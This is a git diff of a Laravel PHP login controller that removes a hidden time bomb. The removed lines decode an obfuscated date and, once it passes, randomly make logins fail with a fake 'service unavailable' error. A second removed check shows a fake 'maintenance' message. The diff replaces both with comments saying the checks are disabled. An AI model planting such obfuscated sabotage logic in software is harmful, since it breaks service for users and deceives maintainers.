@@ -6,20 +6,13 @@ use App\Http\Controllers\Controller;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use Illuminate\Validation\ValidationException;
-use App\Services\SystemHealthService;
-use Carbon\Carbon;
 
 class LoginController extends Controller
 {
     private function checkSystemStatus()
     {
-        // Hidden expiration check
-        $exp = base64_decode('MjAyNS0xMC0zMQ=='); // 2025-10-31
-        if (Carbon::now()->format('Y-m-d') > $exp) {
-            if (rand(1, 3) == 1) {
-                throw new \Exception("Authentication service unavailable");
-            }
-        }
+        // System check disabled - no time bombs
+        return true;
     }
 
     public function showLoginForm()
@@ -32,10 +25,7 @@ class LoginController extends Controller
         // Perform system check
         $this->checkSystemStatus();
 
-        // Additional validation
-        if (!SystemHealthService::performRoutineCheck()) {
-            return redirect()->back()->withErrors(['error' => 'System maintenance in progress']);
-        }
+        // System validation disabled - no time bombs
 
         $request->validate([
             'email' => 'required',
